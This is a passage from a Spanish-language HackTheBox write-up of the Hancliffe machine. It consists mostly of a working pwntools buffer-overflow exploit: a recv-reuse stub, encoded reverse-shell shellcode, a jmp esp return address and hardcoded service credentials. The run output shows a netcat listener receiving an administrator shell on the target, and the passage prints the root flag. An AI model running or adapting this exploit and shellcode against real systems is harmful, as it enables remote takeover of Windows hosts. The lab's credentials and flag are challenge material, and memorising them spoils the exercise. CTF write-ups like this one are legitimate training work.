buf += b"\xe8\xc9\xaa\xa2\xda\x56\x01\x2c\x57\x1e\x8f\xab"
buf += b"\x98\x35\x77\x23\x67\xb6\x88\x6a\xac\xe2\xd8\x04"
buf += b"\x05\x8b\xb2\xd4\xaa\x5e\x14\x84\x04\x31\xd5\x74"
buf += b"\xe5\xe1\xbd\x9e\xea\xde\xde\xa1\x20\x77\x74\x58"
buf += b"\xa3\x72\x83\x62\xb1\xeb\x91\x62\xb4\x50\x1c\x84"
buf += b"\xdc\xb6\x49\x1f\x49\x2e\xd0\xeb\xe8\xaf\xce\x96"
buf += b"\x2b\x3b\xfd\x67\xe5\xcc\x88\x7b\x92\x3c\xc7\x21"
buf += b"\x35\x42\xfd\x4d\xd9\xd1\x9a\x8d\x94\xc9\x34\xda"
buf += b"\xf1\x3c\x4d\x8e\xef\x67\xe7\xac\xed\xfe\xc0\x74"
buf += b"\x2a\xc3\xcf\x75\xbf\x7f\xf4\x65\x79\x7f\xb0\xd1"
buf += b"\xd5\xd6\x6e\x8f\x93\x80\xc0\x79\x4a\x7e\x8b\xed"
buf += b"\x0b\x4c\x0c\x6b\x14\x99\xfa\x93\xa5\x74\xbb\xac"
buf += b"\x0a\x11\x4b\xd5\x76\x81\xb4\x0c\x33\xa1\x56\x84"
buf += b"\x4e\x4a\xcf\x4d\xf3\x17\xf0\xb8\x30\x2e\x73\x48"
buf += b"\xc9\xd5\x6b\x39\xcc\x92\x2b\xd2\xbc\x8b\xd9\xd4"
buf += b"\x13\xab\xcb"
```

El script quedaría de la siguiente forma:

```null
from pwn import *
import time

port = sys.argv[1]

r = remote('10.10.0.128', port)

recvcall = b""
recvcall += b"\x54"
recvcall += b"\x58"
recvcall += b"\x66\x05\x90\x01"
recvcall += b"\x66\x2d\x48\x01"
recvcall += b"\x8b\x30"
recvcall += b"\x83\xec\x64"
recvcall += b"\x31\xdb"
recvcall += b"\x53"
recvcall += b"\x66\x81\xc3\x01\x04"
recvcall += b"\x53"
recvcall += b"\x54"
recvcall += b"\x5b"
recvcall += b"\x66\x83\xc3\x64"
recvcall += b"\x53"
recvcall += b"\x56"
recvcall += b"\xa1\xac\x82\x90\x71"
recvcall += b"\xff\xd0"

buf =  b""
buf += b"\xdb\xce\xd9\x74\x24\xf4\xb8\x1b\xcd\x7a\x86\x5b"
buf += b"\x33\xc9\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x58"
buf += b"\xde\x98\x73\xa2\x08\xde\x7c\x5a\xc9\xbf\xf5\xbf"
buf += b"\xf8\xff\x62\xb4\xab\xcf\xe1\x98\x47\xbb\xa4\x08"
buf += b"\xd3\xc9\x60\x3f\x54\x67\x57\x0e\x65\xd4\xab\x11"
buf += b"\xe5\x27\xf8\xf1\xd4\xe7\x0d\xf0\x11\x15\xff\xa0"
buf += b"\xca\x51\x52\x54\x7e\x2f\x6f\xdf\xcc\xa1\xf7\x3c"
buf += b"\x84\xc0\xd6\x93\x9e\x9a\xf8\x12\x72\x97\xb0\x0c"
buf += b"\x97\x92\x0b\xa7\x63\x68\x8a\x61\xba\x91\x21\x4c"
buf += b"\x72\x60\x3b\x89\xb5\x9b\x4e\xe3\xc5\x26\x49\x30"
buf += b"\xb7\xfc\xdc\xa2\x1f\x76\x46\x0e\xa1\x5b\x11\xc5"
buf += b"\xad\x10\x55\x81\xb1\xa7\xba\xba\xce\x2c\x3d\x6c"
buf += b"\x47\x76\x1a\xa8\x03\x2c\x03\xe9\xe9\x83\x3c\xe9"
buf += b"\x51\x7b\x99\x62\x7f\x68\x90\x29\xe8\x5d\x99\xd1"
buf += b"\xe8\xc9\xaa\xa2\xda\x56\x01\x2c\x57\x1e\x8f\xab"
buf += b"\x98\x35\x77\x23\x67\xb6\x88\x6a\xac\xe2\xd8\x04"
buf += b"\x05\x8b\xb2\xd4\xaa\x5e\x14\x84\x04\x31\xd5\x74"
buf += b"\xe5\xe1\xbd\x9e\xea\xde\xde\xa1\x20\x77\x74\x58"
buf += b"\xa3\x72\x83\x62\xb1\xeb\x91\x62\xb4\x50\x1c\x84"
buf += b"\xdc\xb6\x49\x1f\x49\x2e\xd0\xeb\xe8\xaf\xce\x96"
buf += b"\x2b\x3b\xfd\x67\xe5\xcc\x88\x7b\x92\x3c\xc7\x21"
buf += b"\x35\x42\xfd\x4d\xd9\xd1\x9a\x8d\x94\xc9\x34\xda"
buf += b"\xf1\x3c\x4d\x8e\xef\x67\xe7\xac\xed\xfe\xc0\x74"
buf += b"\x2a\xc3\xcf\x75\xbf\x7f\xf4\x65\x79\x7f\xb0\xd1"
buf += b"\xd5\xd6\x6e\x8f\x93\x80\xc0\x79\x4a\x7e\x8b\xed"
buf += b"\x0b\x4c\x0c\x6b\x14\x99\xfa\x93\xa5\x74\xbb\xac"
buf += b"\x0a\x11\x4b\xd5\x76\x81\xb4\x0c\x33\xa1\x56\x84"
buf += b"\x4e\x4a\xcf\x4d\xf3\x17\xf0\xb8\x30\x2e\x73\x48"
buf += b"\xc9\xd5\x6b\x39\xcc\x92\x2b\xd2\xbc\x8b\xd9\xd4"
buf += b"\x13\xab\xcb"

offset = 66 - len(recvcall)
junk = b"A"*offset

jmp_esp = p32(0x7190239F)
jmp_esp70 = b"\xEB\xB8"
payload = recvcall + junk + jmp_esp + jmp_esp70

r.recvuntil(b"Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)

time.sleep(1)

r.sendline(buf)
```

Cambio la IP local por la de HTB y ejecuto contra la máquina víctima por el puerto 9999. Genero de nuevo el payload para mi IP de HTB

```null
python3 bof.py
[+] Opening connection to 10.10.11.115 on port 9999: Done
[*] Closed connection to 10.10.11.115 port 9999
```

Y gano acceso al sistema en una sesión de netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.115] 61940
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
hancliffe\administrator

C:\Windows\system32>
```

Puedo visualizar la segunda flag

```null
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
f2f70690a032551dc7a3f22f8a46be52
```